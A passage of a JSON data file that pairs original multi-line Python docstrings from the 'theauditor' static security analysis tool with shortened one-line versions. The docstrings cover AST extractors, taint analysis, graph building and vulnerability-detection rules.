    "original": "\"\"\"Check for mutations without authentication.\n\n    Strategy:\n    1. Find all Mutation type fields from graphql_fields\n    2. Check for @auth directives in directives_json\n    3. Check if resolver has authentication decorators\n    4. Report mutations without protection\n\n    NO FALLBACKS. Database must exist.\n    \"\"\"",
    "truncated": "\"\"\"Check for mutations without authentication.\"\"\""
  },
  {
    "file": "theauditor/rules/graphql/overfetch.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Detect overfetch patterns in GraphQL resolvers.\n\n    Strategy:\n    1. For each GraphQL type, get its exposed fields\n    2. Find resolvers that query ORM models for that type\n    3. Check if ORM query selects fields not in GraphQL schema\n    4. Flag sensitive fields that are fetched but not exposed\n\n    NO FALLBACKS. Database must exist.\n    \"\"\"",
    "truncated": "\"\"\"Detect overfetch patterns in GraphQL resolvers.\"\"\""
  },
  {
    "file": "theauditor/rules/node/async_concurrency_analyze.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Detect async and concurrency issues in JavaScript/TypeScript.\n\n    This is the main entry point called by the orchestrator.\n\n    Args:\n        context: Standardized rule context with project metadata\n\n    Returns:\n        List of async/concurrency security findings\n    \"\"\"",
    "truncated": "\"\"\"Detect async and concurrency issues in JavaScript/TypeScript.\"\"\""
  },
  {
    "file": "theauditor/rules/node/async_concurrency_analyze.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Calculate confidence that this is a real TOCTOU vulnerability.\n\n        Args:\n            check_func: Check function name\n            write_func: Write function name\n            target: Target identifier\n\n        Returns:\n            0.0-1.0 confidence score\n        \"\"\"",
    "truncated": "\"\"\"Calculate confidence that this is a real TOCTOU vulnerability.\"\"\""
  },
  {
    "file": "theauditor/rules/node/runtime_issue_analyze.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Detect Node.js runtime security issues.\n\n    This is the main entry point called by the orchestrator.\n\n    Args:\n        context: Standardized rule context with project metadata\n\n    Returns:\n        List of runtime security findings\n    \"\"\"",
    "truncated": "\"\"\"Detect Node.js runtime security issues.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/sql_injection_analyze.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"SQL Injection Detection.\n\nDetects SQL injection vulnerabilities from raw patterns captured\nduring indexing.\n\nSchema-driven enforcement (v1.3+):\n- SQL queries table populated during indexing\n- No fallback regex patterns\n- No runtime file scanning\n\"\"\"",
    "truncated": "\"\"\"SQL Injection Detection.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/reactivity_analyze.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Find non-reactive data initialization in Options API.\n\n    Strategy:\n    1. Query vue_components for Options API components (composition_api_used = 0)\n    2. Look for data() methods in symbols table\n    3. Check assignments within data() for object/array literals\n\n    Note: This detection is limited without full AST context.\n    We can detect obvious cases via assignments table.\n    \"\"\"",
    "truncated": "\"\"\"Find non-reactive data initialization in Options API.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/template_xss_analyze.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Template Injection and XSS Detection.\n\nThis module detects template injection vulnerabilities across various template engines.\nCovers both server-side and client-side template injection.\n\nREFACTORED (2025-11-22):\n- Constants moved to constants.py (Single Source of Truth)\n- Context manager + sqlite3.Row for name-based access\n- Memory proximity fix: Query render functions ONCE, not inside loop\n\"\"\"",
    "truncated": "\"\"\"Template Injection and XSS Detection.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/vue_xss_analyze.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Vue.js-specific XSS Detection.\n\nThis module detects XSS vulnerabilities specific to Vue.js applications.\nUses Vue-specific database tables for accurate detection.\n\nREFACTORED (2025-11-22):\n- Constants moved to constants.py (Single Source of Truth)\n- Context manager + sqlite3.Row for name-based access\n- Removed symbol scan heuristic per NO FALLBACK POLICY\n\"\"\"",
    "truncated": "\"\"\"Vue.js-specific XSS Detection.\"\"\""
  },
  {
    "file": "theauditor/security.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"\n    Validate that a package name follows the expected format for its package manager.\n\n    Args:\n        name: The package name to validate\n        manager: The package manager type (\"npm\", \"py\", \"docker\")\n\n    Returns:\n        True if the name is valid, False otherwise\n    \"\"\"",
    "truncated": "\"\"\"Validate that a package name follows the expected format for its package manager.\"\"\""
  },
  {
    "file": "theauditor/session/detector.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"\n    Get all Codex session files matching the project root path.\n\n    Args:\n        root_path: Project root directory\n        sessions_dir: Base ~/.codex/sessions directory\n\n    Returns:\n        List of .jsonl files with matching cwd\n    \"\"\"",
    "truncated": "\"\"\"Get all Codex session files matching the project root path.\"\"\""
  },
  {
    "file": "theauditor/session/diff_scorer.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"DiffScorer - Score code diffs using TheAuditor's SAST pipeline.\n\nThis module runs diffs from Edit/Write tool calls through the complete SAST stack:\n- Taint analysis (SQL injection, XSS, command injection)\n- Pattern detection (f-strings in SQL, hardcoded secrets)\n- FCE correlation (incomplete refactors, missed related files)\n- RCA historical risk (file's failure rate from git history)\n\nAggregate scores into a single risk metric (0.0-1.0).\n\"\"\"",
    "truncated": "\"\"\"DiffScorer - Score code diffs using TheAuditor's SAST pipeline.\"\"\""
  },
  {
    "file": "theauditor/taint/core.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Load patterns from database tables.\n\n        Queries framework_taint_patterns for sources/sinks, framework_safe_sinks\n        and validation_framework_usage for sanitizers.\n\n        Args:\n            cursor: Database cursor for repo_index.db\n\n        Note: ZERO FALLBACK - if tables are empty, returns empty. No hardcoded defaults.\n        \"\"\"",
    "truncated": "\"\"\"Load patterns from database tables.\"\"\""
  },
  {
    "file": "theauditor/taint/core.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Load validation patterns from validation_framework_usage table.\n\n        Schema:\n            validation_framework_usage(\n                file_path, line, framework, method, variable_name,\n                is_validator, argument_expr\n            )\n\n        Registers validation methods as sanitizers (e.g., zod.parse, joi.validate).\n        \"\"\"",
    "truncated": "\"\"\"Load validation patterns from validation_framework_usage table.\"\"\""
  },
  {
    "file": "theauditor/taint/ifds_analyzer.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Build TaintPath object from hop chain.\n\n        Args:\n            source: Source dict\n            sink: Sink dict\n            hop_chain: List of hop metadata dicts\n\n        Returns:\n            TaintPath with full hop chain\n        \"\"\"",
    "truncated": "\"\"\"Build TaintPath object from hop chain.\"\"\""
  },
  {
    "file": "theauditor/taint/sanitizer_util.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Get validation/sanitizer patterns for a file's language.\n\n        Uses TaintRegistry if available, falls back to default patterns.\n\n        Args:\n            file_path: Path to file for language detection\n\n        Returns:\n            List of sanitizer/validation patterns\n        \"\"\"",
    "truncated": "\"\"\"Get validation/sanitizer patterns for a file's language.\"\"\""
  },
  {
    "file": "theauditor/taint/type_resolver.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Check if file is a controller/route handler (any framework).\n\n        Queries api_endpoints table to see if the file handles routes.\n\n        Args:\n            file_path: Path to file\n\n        Returns:\n            True if file contains API endpoints\n        \"\"\"",
    "truncated": "\"\"\"Check if file is a controller/route handler (any framework).\"\"\""
  },
  {
    "file": "theauditor/taint/type_resolver.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Extract model name from edge metadata.\n\n        Useful for traversing ORM edges where metadata contains model info.\n\n        Args:\n            edge_metadata: JSON string or dict from edges.metadata column\n\n        Returns:\n            Model name if found, None otherwise\n        \"\"\"",
    "truncated": "\"\"\"Extract model name from edge metadata.\"\"\""
  },
  {
    "file": "theauditor/terraform/graph.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Resolve resource reference like 'aws_security_group.web' to resource_id.\n\n        Args:\n            cursor: Database cursor\n            ref: Resource reference (e.g., \"aws_security_group.web\")\n            current_file: Current file path\n\n        Returns:\n            resource_id or None if not found\n        \"\"\"",
    "truncated": "\"\"\"Resolve resource reference like 'aws_security_group.web' to resource_id.\"\"\""
  },
  {
    "file": "theauditor/terraform/graph.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Resolve any Terraform reference to node ID.\n\n        Args:\n            cursor: Database cursor\n            ref: Terraform reference (var.X, aws_Y.Z, etc.)\n            current_file: Current file path\n\n        Returns:\n            Node ID or None if not found\n        \"\"\"",
    "truncated": "\"\"\"Resolve any Terraform reference to node ID.\"\"\""
  },
  {
    "file": "theauditor/terraform/graph.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Check if a property is marked as sensitive.\n\n        Args:\n            cursor: Database cursor\n            resource_id: Resource ID\n            property_name: Property name to check\n\n        Returns:\n            True if property is sensitive\n        \"\"\"",
    "truncated": "\"\"\"Check if a property is marked as sensitive.\"\"\""
  },
  {
    "file": "theauditor/utils/code_snippets.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Get code snippet for a line with optional block expansion.\n\n        Args:\n            file_path: Relative path from root_dir\n            line: 1-indexed line number\n            expand_block: If True, expand to include full block (max 15 lines)\n\n        Returns:\n            Formatted snippet with line numbers, or error message string\n        \"\"\"",
    "truncated": "\"\"\"Get code snippet for a line with optional block expansion.\"\"\""
  },
  {
    "file": "theauditor/utils/code_snippets.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Get specific range of lines without block expansion.\n\n        Args:\n            file_path: Relative path from root_dir\n            start_line: 1-indexed start line\n            end_line: 1-indexed end line (inclusive)\n\n        Returns:\n            Formatted snippet with line numbers\n        \"\"\"",
    "truncated": "\"\"\"Get specific range of lines without block expansion.\"\"\""
  },
  {
    "file": "theauditor/utils/code_snippets.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Format lines with line numbers.\n\n        Args:\n            lines: List of file lines\n            start_idx: Start index (0-indexed)\n            end_idx: End index (0-indexed, inclusive)\n\n        Returns:\n            Formatted string with line numbers\n        \"\"\"",
    "truncated": "\"\"\"Format lines with line numbers.\"\"\""
  },
  {
    "file": "theauditor/utils/finding_priority.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Generate sort key for a finding.\n\n    Multi-level sort: severity -> tool -> file -> line\n\n    Args:\n        finding: Dictionary with severity, tool, file, line fields\n\n    Returns:\n        Tuple for sorting (lower values = higher priority)\n    \"\"\"",
    "truncated": "\"\"\"Generate sort key for a finding.\"\"\""
  },
  {
    "file": "theauditor/utils/logger.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"\n    Set up a simple logger.\n\n    Args:\n        name: Logger name (usually __name__)\n        level: Logging level\n\n    Returns:\n        Configured logger instance\n    \"\"\"",
    "truncated": "\"\"\"Set up a simple logger.\"\"\""
  },
  {
    "file": "theauditor/utils/temp_manager.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Create a temporary file in project temp directory.\n\n        Args:\n            root_path: Project root directory\n            suffix: File suffix (e.g., \"_stdout.txt\")\n            prefix: File prefix (e.g., \"tmp\")\n\n        Returns:\n            Tuple of (file_path, file_descriptor)\n        \"\"\"",
    "truncated": "\"\"\"Create a temporary file in project temp directory.\"\"\""
  },
  {
    "file": "theauditor/venv_install.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"\n    Create a Python virtual environment at target_dir/.venv.\n\n    Args:\n        target_dir: Project root directory\n        force: If True, recreate even if exists\n\n    Returns:\n        Path to the created venv directory\n    \"\"\"",
    "truncated": "\"\"\"Create a Python virtual environment at target_dir/.venv.\"\"\""
  },
  {
    "file": "theauditor/venv_install.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"\n    Install TheAuditor in editable mode into the venv.\n\n    Args:\n        venv_path: Path to the virtual environment\n        theauditor_root: Path to TheAuditor source (auto-detected if None)\n\n    Returns:\n        True if installation succeeded\n    \"\"\"",
    "truncated": "\"\"\"Install TheAuditor in editable mode into the venv.\"\"\""
  },
  {
    "file": "theauditor/venv_install.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"\n    Complete venv setup: create and install TheAuditor + ALL linting tools.\n\n    Args:\n        target_dir: Project root directory\n        force: If True, recreate venv even if exists\n\n    Returns:\n        (venv_path, success) tuple\n    \"\"\"",
    "truncated": "\"\"\"Complete venv setup: create and install TheAuditor + ALL linting tools.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/hcl_impl.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Extract attributes from an HCL block body.\n\n    Args:\n        node: tree-sitter body node\n        block_type: Type of block (for attribute filtering)\n\n    Returns:\n        Dictionary of attribute name -> value\n    \"\"\"",
    "truncated": "\"\"\"Extract attributes from an HCL block body.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/async_extractors.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Extract async function definitions from Python AST.\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to the parser instance\n\n    Returns:\n        List of async function records\n    \"\"\"",
    "truncated": "\"\"\"Extract async function definitions from Python AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/async_extractors.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Extract await expressions from Python AST.\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to the parser instance\n\n    Returns:\n        List of await expression records\n    \"\"\"",
    "truncated": "\"\"\"Extract await expressions from Python AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/core_extractors.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Extract function definitions from Python AST.\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to the parser instance for accessing methods\n\n    Returns:\n        List of function info dictionaries\n    \"\"\"",
    "truncated": "\"\"\"Extract function definitions from Python AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/fundamental_extractors.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Find the function containing this node.\n\n    Args:\n        node: AST node to locate\n        function_ranges: List of (name, start, end) tuples\n\n    Returns:\n        Function name or 'global'\n    \"\"\"",
    "truncated": "\"\"\"Find the function containing this node.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/type_extractors.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Extract Protocol class definitions from Python AST.\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to the parser instance\n\n    Returns:\n        List of Protocol records\n    \"\"\"",
    "truncated": "\"\"\"Extract Protocol class definitions from Python AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/type_extractors.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Extract Generic class definitions from Python AST.\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to the parser instance\n\n    Returns:\n        List of Generic records\n    \"\"\"",
    "truncated": "\"\"\"Extract Generic class definitions from Python AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/type_extractors.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Extract TypedDict definitions from Python AST.\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to the parser instance\n\n    Returns:\n        List of TypedDict records\n    \"\"\"",
    "truncated": "\"\"\"Extract TypedDict definitions from Python AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/type_extractors.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Extract Literal type usage from Python AST.\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to the parser instance\n\n    Returns:\n        List of Literal usage records\n    \"\"\"",
    "truncated": "\"\"\"Extract Literal type usage from Python AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/type_extractors.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Extract @overload decorator usage from Python AST.\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to the parser instance\n\n    Returns:\n        List of overload records\n    \"\"\"",
    "truncated": "\"\"\"Extract @overload decorator usage from Python AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/rust_impl.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Extract text for a tree-sitter node.\n\n    Args:\n        node: tree-sitter node\n        content: File content\n\n    Returns:\n        Text content of the node\n    \"\"\"",
    "truncated": "\"\"\"Extract text for a tree-sitter node.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/rust_impl.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Build a map of line numbers to containing function names.\n\n    Args:\n        tree: tree-sitter parse tree\n        content: File content\n\n    Returns:\n        Dict mapping line_number -> function_name\n    \"\"\"",
    "truncated": "\"\"\"Build a map of line numbers to containing function names.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/typescript_impl_structure.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Comprehensively detect JSX in AST node.\n\n    This function handles both preserved and transformed JSX:\n    - Preserved mode: Detects actual JSX syntax nodes\n    - Transformed mode: Detects React.createElement patterns\n\n    Returns:\n        Tuple of (has_jsx, returns_component)\n    \"\"\"",
    "truncated": "\"\"\"Comprehensively detect JSX in AST node.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/typescript_impl_structure.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Build a map of line numbers to containing function names.\n\n    This solves the core problem: traverse() loses track of which function it's in.\n    By pre-mapping all line numbers to their containing functions, we can do O(1)\n    lookups instead of broken recursive tracking.\n\n    Returns:\n        Dict mapping line number to function name for fast lookups\n    \"\"\"",
    "truncated": "\"\"\"Build a map of line numbers to containing function names.\"\"\""
  },
  {
    "file": "theauditor/ast_parser.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Detect the primary project type based on manifest files.\n\n        Returns:\n            'polyglot' if multiple language manifest files exist\n            'javascript' if only package.json exists\n            'python' if only Python manifest files exist\n            'go' if only go.mod exists\n            'unknown' otherwise\n        \"\"\"",
    "truncated": "\"\"\"Detect the primary project type based on manifest files.\"\"\""
  },
  {
    "file": "theauditor/ast_parser.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Parse Python code with caching based on content hash.\n\n        Args:\n            content_hash: MD5 hash of the file content\n            content: The actual file content\n\n        Returns:\n            Parsed AST or None if parsing fails\n        \"\"\"",
    "truncated": "\"\"\"Parse Python code with caching based on content hash.\"\"\""
  },
  {
    "file": "theauditor/ast_parser.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Get list of supported languages.\n\n        Returns:\n            List of language names.\n\n        Note:\n            JavaScript/TypeScript require semantic parser setup (run: aud setup-ai --target .)\n            Will fail loudly at parse time if not configured.\n        \"\"\"",
    "truncated": "\"\"\"Get list of supported languages.\"\"\""
  },
  {
    "file": "theauditor/boundaries/boundary_analyzer.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"\n    Generate human-readable boundary analysis report.\n\n    Args:\n        analysis_results: Output from analyze_input_validation_boundaries()\n\n    Returns:\n        Formatted text report\n    \"\"\"",
    "truncated": "\"\"\"Generate human-readable boundary analysis report.\"\"\""
  },
  {
    "file": "theauditor/cache/ast_cache.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Get cached AST for a file by its hash.\n\n        Args:\n            key: SHA256 hash of the file content\n            context: Additional context (unused for AST cache)\n\n        Returns:\n            Cached AST tree or None if not found\n        \"\"\"",
    "truncated": "\"\"\"Get cached AST for a file by its hash.\"\"\""
  },
  {
    "file": "theauditor/context/deadcode_graph.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Find dead nodes using graph reachability.\n\n        Algorithm:\n        1. Compute reachable set from all entry points\n        2. Dead nodes = all_nodes - reachable_nodes - excluded_nodes\n        3. Cluster dead nodes into zombie clusters (weakly_connected_components)\n\n        NO FALLBACK - returns findings or crashes.\n        \"\"\"",
    "truncated": "\"\"\"Find dead nodes using graph reachability.\"\"\""
  },
  {
    "file": "theauditor/context/deadcode_graph.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Find dead functions/classes within live modules.\n\n        Algorithm:\n        1. Build call graph of symbols within live modules\n        2. Find entry points (exported functions, decorated functions)\n        3. Dead symbols = defined but never called\n\n        NO FALLBACK - crashes if query fails.\n        \"\"\"",
    "truncated": "\"\"\"Find dead functions/classes within live modules.\"\"\""
  },
  {
    "file": "theauditor/context/explain_formatter.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Format symbol explain output.\n\n        Args:\n            data: Symbol context bundle from CodeQueryEngine.get_symbol_context_bundle()\n                  Contains: target, resolved_as, target_type, definition, callers, callees\n\n        Returns:\n            Formatted text output\n        \"\"\"",
    "truncated": "\"\"\"Format symbol explain output.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Function call location with context.\n\n    Attributes:\n        caller_file: File containing the call\n        caller_line: Line number of the call\n        caller_function: Function making the call (None = top-level)\n        callee_function: Function being called\n        arguments: List of argument expressions\n    \"\"\"",
    "truncated": "\"\"\"Function call location with context.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Import or call dependency between files.\n\n    Attributes:\n        source_file: File that imports/calls\n        target_file: File being imported/called\n        import_type: Type of relationship (import, require, call)\n        line: Line number where dependency occurs\n        symbols: List of imported symbols (if applicable)\n    \"\"\"",
    "truncated": "\"\"\"Import or call dependency between files.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Get all symbols defined in a file.\n\n        Args:\n            file_path: File path (partial match supported)\n            limit: Max results\n\n        Returns:\n            List of {name, type, line, end_line, signature, path} dicts\n        \"\"\"",
    "truncated": "\"\"\"Get all symbols defined in a file.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Get function calls made FROM this file.\n\n        Args:\n            file_path: File path (partial match)\n            limit: Max results\n\n        Returns:\n            List of {callee_function, line, arguments, caller_function, file} dicts\n        \"\"\"",
    "truncated": "\"\"\"Get function calls made FROM this file.\"\"\""
  },
  {
    "file": "theauditor/deps.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Parse a Cargo.toml dependency section.\n\n    Args:\n        deps_dict: Dictionary from [dependencies] or [dev-dependencies]\n        kind: 'normal' or 'dev'\n\n    Returns:\n        List of dependency dicts\n    \"\"\"",
    "truncated": "\"\"\"Parse a Cargo.toml dependency section.\"\"\""
  },
  {
    "file": "theauditor/framework_detector.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Resolve a workspace dependency version.\n\n        Args:\n            package_name: Name of the package\n            cargo_toml_path: Path to the Cargo.toml using workspace = true\n\n        Returns:\n            Resolved version string, or \"workspace\" if not found\n        \"\"\"",
    "truncated": "\"\"\"Resolve a workspace dependency version.\"\"\""
  },
  {
    "file": "theauditor/graph/analyzer.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"\n        Initialize analyzer with optional graph for caching.\n\n        If graph is provided, adjacency lists are pre-built for faster\n        repeated queries. If None, methods operate in stateless mode.\n\n        Args:\n            graph: Optional graph dict with 'nodes' and 'edges' keys\n        \"\"\"",
    "truncated": "\"\"\"Initialize analyzer with optional graph for caching.\"\"\""
  },
  {
    "file": "theauditor/graph/analyzer.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"\n        Build adjacency list indices from graph data.\n\n        Pre-computes upstream/downstream relationships for O(1) lookup.\n        Called automatically by __init__ if graph provided.\n\n        Args:\n            graph: Graph dict with 'nodes' and 'edges' keys\n        \"\"\"",
    "truncated": "\"\"\"Build adjacency list indices from graph data.\"\"\""
  },
  {
    "file": "theauditor/graph/cfg_builder.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Get control flow graph for a specific function.\n\n        Args:\n            file_path: Path to the source file\n            function_name: Name of the function\n\n        Returns:\n            CFG dictionary with blocks, edges, and metadata\n        \"\"\"",
    "truncated": "\"\"\"Get control flow graph for a specific function.\"\"\""
  },
  {
    "file": "theauditor/graph/cfg_builder.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Calculate CFG metrics.\n\n        Args:\n            blocks: List of CFG blocks\n            edges: List of CFG edges\n\n        Returns:\n            Dictionary of metrics\n        \"\"\"",
    "truncated": "\"\"\"Calculate CFG metrics.\"\"\""
  },
  {
    "file": "theauditor/graph/cfg_builder.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Find blocks that cannot be reached from entry.\n\n        Args:\n            blocks: List of CFG blocks\n            edges: List of CFG edges\n\n        Returns:\n            Set of unreachable block IDs\n        \"\"\"",
    "truncated": "\"\"\"Find blocks that cannot be reached from entry.\"\"\""
  },
  {
    "file": "theauditor/graph/cfg_builder.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Calculate maximum nesting depth in the CFG.\n\n        Args:\n            blocks: List of CFG blocks\n            edges: List of CFG edges\n\n        Returns:\n            Maximum nesting depth\n        \"\"\"",
    "truncated": "\"\"\"Calculate maximum nesting depth in the CFG.\"\"\""
  },
  {
    "file": "theauditor/graph/cfg_builder.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Export CFG as Graphviz DOT format.\n\n        Args:\n            file_path: Path to the source file\n            function_name: Name of the function\n\n        Returns:\n            DOT format string\n        \"\"\"",
    "truncated": "\"\"\"Export CFG as Graphviz DOT format.\"\"\""
  },
  {
    "file": "theauditor/graph/cfg_builder.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Control Flow Graph Builder - reads CFG data from database.\n\nThis module builds control flow graphs from data stored in the database\nduring the indexing phase. It provides analysis capabilities including:\n- Cyclomatic complexity calculation\n- Path analysis\n- Dead code detection\n- Loop detection\n\"\"\"",
    "truncated": "\"\"\"Control Flow Graph Builder - reads CFG data from database.\"\"\""
  },
  {
    "file": "theauditor/graph/db_cache.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Initialize cache by loading all data once.\n\n        Args:\n            db_path: Path to repo_index.db\n\n        Raises:\n            FileNotFoundError: If database doesn't exist (NO FALLBACK)\n            sqlite3.Error: If schema wrong or query fails (NO FALLBACK)\n        \"\"\"",
    "truncated": "\"\"\"Initialize cache by loading all data once.\"\"\""
  },
  {
    "file": "theauditor/graph/db_cache.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Get cache statistics.\n\n        Returns:\n            Dict with file count, import count, export count\n\n        Example:\n            >>> cache.get_stats()\n            {\"files\": 360, \"imports\": 1243, \"exports\": 892}\n        \"\"\"",
    "truncated": "\"\"\"Get cache statistics.\"\"\""
  },
  {
    "file": "theauditor/graph/store.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"\n        Generic graph loader for any graph type.\n\n        Args:\n            graph_type: Graph type identifier to load\n\n        Returns:\n            Graph dict with 'nodes' and 'edges' keys\n        \"\"\"",
    "truncated": "\"\"\"Generic graph loader for any graph type.\"\"\""
  },
  {
    "file": "theauditor/graph/store.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"\n        Get most recent analysis result of given type.\n\n        Args:\n            analysis_type: Type of analysis\n\n        Returns:\n            Analysis result dict or None if not found\n        \"\"\"",
    "truncated": "\"\"\"Get most recent analysis result of given type.\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/interceptors.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Build interceptor edges from middleware chains and decorators.\n\n        Args:\n            db_path: Path to repo_index.db\n            root: Project root directory\n\n        Returns:\n            Dict with nodes, edges, and metadata (same format as other strategies)\n        \"\"\"",
    "truncated": "\"\"\"Build interceptor edges from middleware chains and decorators.\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/interceptors.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Build edges from Express middleware chains.\n\n        Logic:\n        1. Group middleware by route (method + path)\n        2. Sort by execution_order\n        3. Create chain: Route Entry -> MW1 -> MW2 -> Controller\n\n        Node IDs follow dfg_builder pattern: file::scope::variable\n        \"\"\"",
    "truncated": "\"\"\"Build edges from Express middleware chains.\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/interceptors.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Graph strategy to wire up interceptors (Middleware, Decorators).\n\n    Connects:\n    1. Express Middleware Chains (Route -> Middleware -> Controller)\n    2. Python Decorators (Decorator -> Function)\n\n    This enables Taint Analysis to naturally walk through validation layers\n    and mark flows as SANITIZED when they pass through validators.\n    \"\"\"",
    "truncated": "\"\"\"Graph strategy to wire up interceptors (Middleware, Decorators).\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/node_orm.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Build edges for Node.js ORM relationships.\n\n        Args:\n            db_path: Path to repo_index.db\n            project_root: Project root for metadata\n\n        Returns:\n            Dict with nodes, edges, metadata for ORM expansions\n        \"\"\"",
    "truncated": "\"\"\"Build edges for Node.js ORM relationships.\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/python_orm.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Build edges for Python ORM relationships.\n\n        Args:\n            db_path: Path to repo_index.db\n            project_root: Project root for metadata\n\n        Returns:\n            Dict with nodes, edges, metadata for ORM expansions\n        \"\"\"",
    "truncated": "\"\"\"Build edges for Python ORM relationships.\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/python_orm.py",
